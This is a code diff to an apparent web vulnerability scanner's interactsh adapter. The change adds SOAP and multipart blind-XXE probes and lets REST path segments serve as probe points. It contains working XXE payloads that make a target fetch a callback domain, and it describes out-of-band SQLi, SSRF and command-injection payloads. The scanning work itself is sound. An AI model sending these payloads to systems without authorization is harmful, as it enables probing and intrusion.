@@ -20,59 +20,57 @@ follow-ups" on full data-chaining):
 - **Blind SQL injection** — parameter value set to a DBMS-specific
   out-of-band payload (MSSQL ``xp_dirtree``, Oracle ``UTL_INADDR``) that
   forces a DNS lookup if the query is actually executed.
-- **Blind XXE** — a dedicated, parameter-independent probe: the target's
-  own URL is POSTed a crafted XML document declaring an external entity
-  that points at our domain. A compliant-but-unhardened XML parser resolves
-  that entity server-side, confirming it even though nothing is reflected
-  back and no query parameter is involved at all.
+- **Blind XXE** — three dedicated, parameter-independent probes, one per
+  delivery shape a real XML endpoint might expect: a bare
+  ``application/xml`` POST, a SOAP 1.1 envelope (``text/xml`` +
+  ``SOAPAction``), and a ``multipart/form-data`` upload with the XML as a
+  file part. Each POSTs straight to the target's own URL (query string
+  untouched — see point 2 below) with its own correlation domain, so a
+  target accepting only one of the three shapes still gets caught. A
+  compliant-but-unhardened XML parser resolves the external entity
+  server-side, confirming it even though nothing is reflected back and no
+  query parameter is involved at all.
 
 Mechanism, generalised across the three *parameter-substitution* classes
 (SSRF/RCE/SQLi):
 
 1. Start ``interactsh-client``, asking it to generate one unique correlation
    domain **per (probe point, payload) combination** on the target, **plus
-   one more for the XXE probe** (``-n <count>``), and write them to a local
-   file (``-ps``/``-psf``) — so a later callback can be attributed back to
-   the exact probe point *and* vulnerability class that caused it. A probe
-   point is a GET query parameter (parsed straight from ``target``'s own
-   URL), a POST form field, or a JSON body leaf — the latter two only when
-   ``ctx.extra["endpoints"]`` carries a crawled :class:`~core.crawler.CrawledEndpoint`
-   for ``target`` with forms/``json_requests`` on it (``scanner.py`` always
-   sets this). Form fields and JSON leaves reuse ``core/json_fuzz.py``'s
-   ``fuzz_targets_for`` — the exact same leaf-walk/path-segment machinery
-   ``sqli_check``/``nosql_check``/``xss_check`` already fuzz with — so this
-   adapter needs no parsing logic of its own for either.
+   one more per XXE delivery shape** (``-n <count>``), and write them to a
+   local file (``-ps``/``-psf``) — so a later callback can be attributed back
+   to the exact probe point *and* vulnerability class that caused it. A
+   probe point is a GET query parameter (parsed straight from ``target``'s
+   own URL), a POST form field, a JSON body leaf, or a REST-style path
+   segment inside a captured JSON request's own URL (e.g. the ``42`` in
+   ``/users/42``) — the latter three only when ``ctx.extra["endpoints"]``
+   carries a crawled :class:`~core.crawler.CrawledEndpoint` for ``target``
+   with forms/``json_requests`` on it (``scanner.py`` always sets this).
+   Form fields, JSON leaves and path segments all reuse
+   ``core/json_fuzz.py``'s ``fuzz_targets_for`` — the exact same
+   leaf-walk/path-segment machinery ``sqli_check``/``nosql_check``/
+   ``xss_check`` already fuzz with, including its full-value ``replace`` —
+   so this adapter needs no parsing logic of its own for any of them.
 2. For each combination, issue one request with that probe point's value
    *replaced outright* by the corresponding payload rendered against its own
-   domain (every other parameter/field/leaf left untouched): a GET for a
-   query parameter, a POST (form-encoded) for a form field, a POST (JSON)
-   for a body leaf. Separately, issue one POST of the rendered XXE document
-   to the target itself — unrelated to any probe point.
+   domain (every other parameter/field/leaf/segment left untouched): a GET
+   for a query parameter, a POST (form-encoded) for a form field, a POST
+   (JSON) for a body leaf or a JSON request's path segment. Separately,
+   issue one POST per XXE delivery shape to the target itself (its own
+   query string, if any, stays on the URL exactly as given — a POST
+   doesn't drop it) — unrelated to any probe point.
 3. Give the server a short grace period to make any outbound call, then read
    whatever interactions ``interactsh-client`` logged (``-json -o <file>``) —
    a DNS lookup alone already proves the server tried to resolve our domain;
    a completed HTTP request proves it went further.
 4. Map each distinct domain that fired into one Finding, attributed to its
-   probe point (or, for XXE, a ``<xml body>`` placeholder — there is no
-   parameter) and vulnerability class, and tear the client down.
+   probe point (or, for XXE, a ``<xml body (shape)>`` placeholder — there is
+   no parameter) and vulnerability class, and tear the client down.
 
-The XXE probe always runs, even against a target with no probe points at
-all (it needs none) — the client now starts for *every* target. The
+The XXE probes always run, even against a target with no probe points at
+all (they need none) — the client now starts for *every* target. The
 SSRF/RCE/SQLi substitution probes simply have nothing to contribute when
-there are none, so only the XXE domain gets requested and probed in that
-case.
-
-shortcut: a REST-style path segment (e.g. the ``42`` in ``/users/42``) is
-not a probe point here, unlike the leaf-walker's other consumers — an OOB
-payload needs to *replace* the segment outright (the same way a query
-parameter or JSON leaf does), and ``core/json_fuzz.py``'s path-segment
-target only supports *appending* to it (meant for ID-swap/boundary-probe
-style fuzzing, not a full-value substitution); upgrade if a real target's
-object-reference path segment turns out to matter here. The XXE probe only
-tries a bare ``application/xml`` POST of the target's own URL — not a SOAP
-envelope, not a multipart/XML part, and not the URL's existing query
-parameters re-sent alongside the XML body; upgrade if a real target's XML
-endpoint needs a different shape to parse the body at all.
+there are none, so only the three XXE domains get requested and probed in
+that case.
 
 Licence note
 ------------
@@ -190,7 +188,9 @@ def _render_xxe_payload(domain: str) -> str:
     A minimal external-entity XML document: ``&xxe;`` forces a compliant
     parser to fetch ``domain`` to resolve it, with no file path or further
     exploitation attempted — this probe only needs to prove the fetch
-    happens at all.
+    happens at all. Shared by the bare and multipart delivery shapes (the
+    XML document itself doesn't change, only how it's wrapped in the
+    request).
     """
     return (
         '<?xml version="1.0" encoding="UTF-8"?>'
@@ -199,9 +199,76 @@ def _render_xxe_payload(domain: str) -> str:
     )
 
 
-#: Finding.parameter placeholder for the XXE probe — it has no query
-#: parameter at all, the whole request body is the injection vector.
-_XXE_PARAM_LABEL = "<xml body>"
+def _render_xxe_soap_payload(domain: str) -> str:
+    """
+    The same external-entity declaration, with the root wrapped in a SOAP
+    1.1 envelope — some XML endpoints (classic SOAP web services) only parse
+    a request shaped this way, never a bare document.
+    """
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        f'<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "http://{domain}/">]>'
+        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+        "<soap:Body><vortex>&xxe;</vortex></soap:Body></soap:Envelope>"
+    )
+
+
+def _send_xxe_probe_bare(target: str, domain: str) -> None:
+    """POST a bare ``application/xml`` document straight to ``target``."""
+    try:
+        requests.post(
+            target,
+            data=_render_xxe_payload(domain).encode("utf-8"),
+            headers={"Content-Type": "application/xml"},
+            timeout=_PROBE_TIMEOUT,
+        )
+    except requests.exceptions.RequestException as exc:
+        logger.debug("interactsh XXE probe (bare) request failed (ignored): %s", exc)
+
+
+def _send_xxe_probe_soap(target: str, domain: str) -> None:
+    """POST the XXE payload as a SOAP 1.1 envelope (``text/xml`` + ``SOAPAction``)."""
+    try:
+        requests.post(
+            target,
+            data=_render_xxe_soap_payload(domain).encode("utf-8"),
+            headers={"Content-Type": "text/xml; charset=utf-8", "SOAPAction": '""'},
+            timeout=_PROBE_TIMEOUT,
+        )
+    except requests.exceptions.RequestException as exc:
+        logger.debug("interactsh XXE probe (SOAP) request failed (ignored): %s", exc)
+
+
+def _send_xxe_probe_multipart(target: str, domain: str) -> None:
+    """POST the XXE payload as a ``multipart/form-data`` XML file part — the
+    shape a file-upload endpoint expects, letting ``requests`` build the
+    boundary/headers itself."""
+    try:
+        requests.post(
+            target,
+            files={"file": ("payload.xml", _render_xxe_payload(domain).encode("utf-8"), "application/xml")},
+            timeout=_PROBE_TIMEOUT,
+        )
+    except requests.exceptions.RequestException as exc:
+        logger.debug("interactsh XXE probe (multipart) request failed (ignored): %s", exc)
+
+
+class _XxeProbeSpec(NamedTuple):
+    """One XXE delivery shape: its ``Finding.parameter`` placeholder (there's
+    no real parameter — the whole request body is the injection vector) and
+    how to send it."""
+
+    param_label: str
+    send: Callable[[str, str], None]  # (target, domain) -> None
+
+
+#: One probe per delivery shape a real XML endpoint might expect — a target
+#: accepting only one of these still gets caught.
+_XXE_PROBE_SPECS: List[_XxeProbeSpec] = [
+    _XxeProbeSpec("<xml body (bare)>", _send_xxe_probe_bare),
+    _XxeProbeSpec("<xml body (SOAP)>", _send_xxe_probe_soap),
+    _XxeProbeSpec("<xml body (multipart)>", _send_xxe_probe_multipart),
+]
 
 #: Per-vulnerability-class finding content. ``description``/``payload_preview``
 #: are ``str.format`` templates filled in with the actual protocol/param/domain.
@@ -333,9 +400,9 @@ class InteractshAdapter(ToolAdapter):
         "Out-of-band (OAST) interaction testing via interactsh-client. "
         "Substitutes a unique callback domain + payload into each query "
         "parameter and confirms blind SSRF, OS command injection and SQL "
-        "injection (MSSQL/Oracle), plus a dedicated parameter-independent "
-        "blind-XXE probe, via a DNS/HTTP callback that reflection-based "
-        "checks can't see. Optional external tool."
+        "injection (MSSQL/Oracle), plus dedicated parameter-independent "
+        "blind-XXE probes (bare/SOAP/multipart), via a DNS/HTTP callback "
+        "that reflection-based checks can't see. Optional external tool."
     )
     #: Startup + probing + settle time, all told.
     default_timeout: float = 90.0
@@ -413,18 +480,18 @@ class InteractshAdapter(ToolAdapter):
         combos: List[Tuple[_ProbePoint, _ProbeSpec]] = [
             (point, spec) for point in points for spec in _PROBE_SPECS
         ]
-        # The XXE probe needs no probe point at all, so it always runs — one
-        # extra domain slot, independent of `combos`.
+        # The XXE probes need no probe point at all, so they always run —
+        # one extra domain slot per delivery shape, independent of `combos`.
         if not combos:
             logger.info(
                 "interactsh: '%s' has no query parameters/form fields/JSON "
-                "body leaves — only the XXE probe will run.",
+                "body leaves/path segments — only the XXE probes will run.",
                 target,
             )
 
         deadline = time.monotonic() + min(self.default_timeout, ctx.tool_timeout)
         workdir = tempfile.mkdtemp(prefix="vortex-interactsh-")
-        self._n = len(combos) + 1
+        self._n = len(combos) + len(_XXE_PROBE_SPECS)
         self._payload_file = os.path.join(workdir, "payloads.txt")
         self._interactions_file = os.path.join(workdir, "interactions.jsonl")
 
@@ -450,10 +517,11 @@ class InteractshAdapter(ToolAdapter):
                     self._domain_to_combo[label] = (point.parameter, spec.kind)
                     point.send(spec.render(domain))
 
-                xxe_domain = domains[len(combos)]
-                xxe_label = xxe_domain.split(".", 1)[0]
-                self._domain_to_combo[xxe_label] = (_XXE_PARAM_LABEL, "xxe")
-                self._send_xxe_probe(target, _render_xxe_payload(xxe_domain))
+                xxe_domains = domains[len(combos) : len(combos) + len(_XXE_PROBE_SPECS)]
+                for xxe_spec, domain in zip(_XXE_PROBE_SPECS, xxe_domains):
+                    label = domain.split(".", 1)[0]
+                    self._domain_to_combo[label] = (xxe_spec.param_label, "xxe")
+                    xxe_spec.send(target, domain)
 
                 time.sleep(max(0.0, min(_SETTLE_SECONDS, deadline - time.monotonic())))
 
@@ -485,7 +553,7 @@ class InteractshAdapter(ToolAdapter):
             if endpoint.url != target:
                 continue
             points.extend(cls._form_field_points(endpoint))
-            points.extend(cls._json_body_points(endpoint))
+            points.extend(cls._json_request_points(endpoint))
         return points
 
     @staticmethod
@@ -528,12 +596,16 @@ class InteractshAdapter(ToolAdapter):
         return points
 
     @classmethod
-    def _json_body_points(cls, endpoint: CrawledEndpoint) -> List[_ProbePoint]:
-        """One point per scalar leaf of every JSON request captured on this page."""
+    def _json_request_points(cls, endpoint: CrawledEndpoint) -> List[_ProbePoint]:
+        """One point per scalar JSON leaf and fuzzable REST path segment of
+        every JSON request captured on this page — both kinds support
+        full-value replacement (``core/json_fuzz.py``'s path-segment target
+        coerces the payload to a plain string, the same as a body leaf
+        accepts)."""
         points: List[_ProbePoint] = []
         for captured in endpoint.json_requests:
             for fuzz_target in fuzz_targets_for(captured):
-                if fuzz_target.kind != "body" or fuzz_target.replace is None:
+                if fuzz_target.replace is None:
                     continue
                 replace = fuzz_target.replace  # the None check above narrows this for mypy
 
@@ -579,19 +651,6 @@ class InteractshAdapter(ToolAdapter):
             requests.post(url, json=json_body, timeout=_PROBE_TIMEOUT)
         except requests.exceptions.RequestException as exc:
             logger.debug("interactsh JSON probe request failed (ignored): %s", exc)
-
-    @staticmethod
-    def _send_xxe_probe(target: str, xml_body: str) -> None:
-        """POST ``xml_body`` straight to ``target`` — no query-param involved."""
-        try:
-            requests.post(
-                target,
-                data=xml_body.encode("utf-8"),
-                headers={"Content-Type": "application/xml"},
-                timeout=_PROBE_TIMEOUT,
-            )
-        except requests.exceptions.RequestException as exc:
-            logger.debug("interactsh XXE probe request failed (ignored): %s", exc)
 
     def _wait_for_payloads(self, deadline: float) -> List[str]:
         """Poll the payload file until it has one line per requested domain."""
